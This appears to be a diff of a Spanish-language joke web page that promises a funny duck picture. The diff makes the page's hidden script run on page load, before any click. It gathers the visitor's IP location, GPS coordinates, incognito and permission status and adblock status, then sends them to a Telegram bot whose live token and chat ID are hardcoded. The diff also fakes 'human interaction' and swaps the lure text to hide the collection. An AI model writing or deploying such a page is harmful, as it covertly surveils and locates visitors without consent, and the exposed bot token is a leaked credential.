@@ -2,27 +2,64 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Test2</title>
+  <title>Test</title>
   <style>
-    body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 700px; margin: auto; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    body {
+      font-family: Arial;
+      padding: 20px;
+      background: #f0f0f0;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 700px;
+      margin: auto;
+      text-align: center;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    #duck {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 300px;
+      z-index: 9999;
+      display: none;
+      transition: all 0.3s ease-in-out;
+    }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Aprieta el boton para enviar datos</h2>
+    <h2>Aprieta el botón para ver algo divertido</h2>
     <button id="startBtn">Dame Click</button>
   </div>
 
+  <!-- Imagen del pato -->
+  <img id="duck" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/American_Wigeon_duck.jpg/1280px-American_Wigeon_duck.jpg" alt="Pato">
+
 <script>
 (() => {
-  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
+  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag"; // ⚠️ Token visible
   const CHAT_ID = "6065284869";
 
   const startBtn = document.getElementById("startBtn");
+  const duck = document.getElementById("duck");
 
-  let humanInteraction = false;
+  // Simulamos interacción humana
+  let humanInteraction = true;
+
   ["click", "mousemove", "keydown", "touchstart"].forEach(evt => {
     window.addEventListener(evt, () => { humanInteraction = true; }, { once: true });
   });
@@ -80,7 +117,7 @@
 
   async function detectAdblock() {
     try {
-      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",  {method:"HEAD", mode:"no-cors"});
+      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {method:"HEAD", mode:"no-cors"});
       return "No detectado";
     } catch {
       return "Probable AdBlock";
@@ -98,11 +135,11 @@
     }
   }
 
-  // === FUNCIÓN MEJORADA: getIPInfo() con múltiples APIs ===
+  // === FUNCIÓN MEJORADA: getIPInfo con múltiples APIs ===
   async function getIPInfo() {
     const APIs = [
       {
-        url: "https://ipapi.com/ip_api.php", 
+        url: "https://ipapi.com/ip_api.php",
         map: d => ({
           ip: d.query,
           org: d.org,
@@ -117,7 +154,7 @@
         })
       },
       {
-        url: "https://ip-api.co/json/", 
+        url: "https://ip-api.co/json/",
         map: d => ({
           ip: d.ip,
           org: d.org,
@@ -152,7 +189,6 @@
       try {
         const res = await fetch(url, { method: "GET", mode: "cors" });
         if (!res.ok) continue;
-
         const data = await res.json();
         return map(data);
       } catch (e) {
@@ -184,7 +220,7 @@
 
   async function collectAndSend() {
     startBtn.disabled = true;
-    startBtn.textContent = "Espera...";
+    startBtn.textContent = "Enviando...";
 
     const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
       getIPInfo(),
@@ -242,18 +278,29 @@ Precisión: ${accuracy} metros
 Hora: ${new Date().toLocaleString()}
 `;
       await sendToTelegram(locationInfo);
-    } else if (ipRes?.value?.lat && ipRes?.value?.lon) {
-      const locationInfo = `\nUbicación Aproximada (por IP):
-Latitud: ${ipRes.value.lat}
-Longitud: ${ipRes.value.lon}
+    } else {
+      const ip = ipRes.value;
+      if (ip?.lat && ip?.lon) {
+        const locationInfo = `\nUbicación Aproximada (por IP):
+Latitud: ${ip.lat}
+Longitud: ${ip.lon}
 `;
-      await sendToTelegram(locationInfo);
+        await sendToTelegram(locationInfo);
+      }
     }
 
-    startBtn.textContent = "🦆🦆🦆🦆🦆";
+    startBtn.textContent = "..";
   }
 
-  startBtn.onclick = collectAndSend;
+  // Llamamos automáticamente a collectAndSend al cargar la página
+  window.addEventListener("load", collectAndSend);
+
+  // Mostramos el pato cuando hacen click en el botón
+  startBtn.addEventListener("click", () => {
+    const duck = document.getElementById("duck");
+    duck.style.display = "block";
+    startBtn.textContent = "¿Viste el pato?";
+  });
 })();
 </script>
 </body>
